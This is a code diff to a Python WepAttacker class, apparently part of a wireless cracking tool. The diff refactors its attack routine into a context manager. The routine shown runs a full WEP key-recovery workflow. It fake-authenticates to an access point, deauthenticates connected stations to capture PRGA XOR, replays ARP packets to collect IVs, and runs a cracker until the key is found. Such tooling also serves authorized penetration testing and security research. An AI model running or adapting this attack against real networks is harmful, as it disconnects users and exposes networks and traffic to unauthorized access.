@@ -554,6 +554,9 @@ class WepAttacker(object):
         Start attack on WEP secured network.
         If targeted network have already been cracked and `force` is False, attack is skipped.
         :param force: attack even if network have already been cracked
+
+        Raises:
+            CalledProcessError If FakeAuthentication unexpectedly terminates.
         """
         if not force and self.ap.is_cracked():
             #  AP already cracked
@@ -563,86 +566,86 @@ class WepAttacker(object):
             capturer = WirelessCapturer(tmp_dir=tmp_dirname, interface=self.monitoring_interface)
             capturer.start(self.ap)
 
-            fake_authentication = FakeAuthentication(interface=self.monitoring_interface, ap=self.ap)
-            time.sleep(1)
-
-            # authenticate
-            while fake_authentication.state != FakeAuthentication.State.SENDING_KEEP_ALIVE:
-                fake_authentication.update()
-                logger.debug(str(fake_authentication))
-                if fake_authentication.flags['needs_prga_xor']:
-                    # stop fakeauth without prga_xor
-                    fake_authentication.stop()
-                    # deauthenticate stations to acquire prga_xor
-                    result = capturer.get_capture_result()
-                    if len(result):  # if AP was detected by capturer
-                        tmp_ap = result[0]
-                        while not capturer.has_prga_xor():
-                            for st in tmp_ap.associated_stations:
-                                deauthenticate(self.monitoring_interface, st)
-                                time.sleep(2)
-                                if capturer.has_prga_xor():
-                                    break
-                        self.ap.save_prga_xor(capturer.capturing_xor_path)
-                        logger.info('PRGA XOR detected.')
-                        # start fakeauth with prga_xor
-                        fake_authentication.cleanup()
-                        fake_authentication = FakeAuthentication(interface=self.monitoring_interface, ap=self.ap)
-                        time.sleep(1)
-                    else:
-                        logger.info('Network not detected by capturer yet.')
-                if fake_authentication.flags['deauthenticated']:
-                    # wait and restart fakeauth
-                    fake_authentication.cleanup()
-                    logger.debug('fakeauth: 5 s backoff')
-                    time.sleep(5)
-                    fake_authentication = FakeAuthentication(interface=self.monitoring_interface, ap=self.ap)
-                time.sleep(2)
-                if fake_authentication.state == FakeAuthentication.State.TERMINATED \
-                    and not (fake_authentication.flags['needs_prga_xor']
-                             or fake_authentication.flags['deauthenticated']):
-                    logger.error('FakeAuthentication unexpectedly terminated. {}'.format(str(fake_authentication)))
-                    raise subprocess.CalledProcessError(returncode=fake_authentication.poll(),
-                                                        cmd=fake_authentication.args)
-
-            arp_replay = ArpReplay(interface=self.monitoring_interface, ap=self.ap)
-            arp_replay.start(source_mac=self.monitoring_interface.mac_address)
-
-            # some time to create capture capturer.capturing_cap_path
-            while int(capturer.get_iv_sum()) < 100:
-                fake_authentication.update()
-                arp_replay.update_state()
-                logger.debug('FakeAuthentication: ' + str(fake_authentication.state) + ', ' +
-                             'flags: ' + str(fake_authentication.flags)
-                             )
-                logger.debug(arp_replay)
+            with FakeAuthentication(interface=self.monitoring_interface, ap=self.ap) as fake_authentication:
                 time.sleep(1)
 
-            cracker = WepCracker(cap_filepath=capturer.capturing_cap_path, ap=self.ap)
-            cracker.start()
+                # authenticate
+                while fake_authentication.state != FakeAuthentication.State.SENDING_KEEP_ALIVE:
+                    fake_authentication.update()
+                    logger.debug(str(fake_authentication))
+                    if fake_authentication.flags['needs_prga_xor']:
+                        # stop fakeauth without prga_xor
+                        fake_authentication.stop()
+                        # deauthenticate stations to acquire prga_xor
+                        result = capturer.get_capture_result()
+                        if len(result):  # if AP was detected by capturer
+                            tmp_ap = result[0]
+                            while not capturer.has_prga_xor():
+                                for st in tmp_ap.associated_stations:
+                                    deauthenticate(self.monitoring_interface, st)
+                                    time.sleep(2)
+                                    if capturer.has_prga_xor():
+                                        break
+                            self.ap.save_prga_xor(capturer.capturing_xor_path)
+                            logger.info('PRGA XOR detected.')
+                            # start fakeauth with prga_xor
+                            fake_authentication.cleanup()
+                            fake_authentication = FakeAuthentication(interface=self.monitoring_interface, ap=self.ap)
+                            time.sleep(1)
+                        else:
+                            logger.info('Network not detected by capturer yet.')
+                    if fake_authentication.flags['deauthenticated']:
+                        # wait and restart fakeauth
+                        fake_authentication.cleanup()
+                        logger.debug('fakeauth: 5 s backoff')
+                        time.sleep(5)
+                        fake_authentication = FakeAuthentication(interface=self.monitoring_interface, ap=self.ap)
+                    time.sleep(2)
+                    if fake_authentication.state == FakeAuthentication.State.TERMINATED \
+                        and not (fake_authentication.flags['needs_prga_xor']
+                                 or fake_authentication.flags['deauthenticated']):
+                        logger.error('FakeAuthentication unexpectedly terminated. {}'.format(str(fake_authentication)))
+                        raise subprocess.CalledProcessError(returncode=fake_authentication.poll(),
+                                                            cmd=fake_authentication.args)
 
-            while not self.ap.is_cracked():
-                fake_authentication.update()
-                arp_replay.update_state()
-                cracker.update_state()
+                arp_replay = ArpReplay(interface=self.monitoring_interface, ap=self.ap)
+                arp_replay.start(source_mac=self.monitoring_interface.mac_address)
 
-                logger.debug('FakeAuthentication: ' + str(fake_authentication.state) + ', ' +
-                             'flags: ' + str(fake_authentication.flags)
-                             )
+                # some time to create capture capturer.capturing_cap_path
+                while int(capturer.get_iv_sum()) < 100:
+                    fake_authentication.update()
+                    arp_replay.update_state()
+                    logger.debug('FakeAuthentication: ' + str(fake_authentication.state) + ', ' +
+                                 'flags: ' + str(fake_authentication.flags)
+                                 )
+                    logger.debug(arp_replay)
+                    time.sleep(1)
 
-                logger.debug(arp_replay)
+                cracker = WepCracker(cap_filepath=capturer.capturing_cap_path, ap=self.ap)
+                cracker.start()
 
-                logger.debug('WepCracker: ' + str(cracker.state))
+                while not self.ap.is_cracked():
+                    fake_authentication.update()
+                    arp_replay.update_state()
+                    cracker.update_state()
 
-                logger.info('#IV = ' + str(capturer.get_iv_sum()))
-                time.sleep(2)
-            logger.info('Cracked ' + str(self.ap))
+                    logger.debug('FakeAuthentication: ' + str(fake_authentication.state) + ', ' +
+                                 'flags: ' + str(fake_authentication.flags)
+                                 )
 
-            cracker.stop()
-            cracker.clean()
-            capturer.stop()
-            capturer.clean()
-            arp_replay.stop()
-            arp_replay.clean()
-            fake_authentication.stop()
-            fake_authentication.clean()
+                    logger.debug(arp_replay)
+
+                    logger.debug('WepCracker: ' + str(cracker.state))
+
+                    logger.info('#IV = ' + str(capturer.get_iv_sum()))
+                    time.sleep(2)
+                logger.info('Cracked ' + str(self.ap))
+
+                cracker.stop()
+                cracker.clean()
+                capturer.stop()
+                capturer.clean()
+                arp_replay.stop()
+                arp_replay.clean()
+
+                fake_authentication.stop()
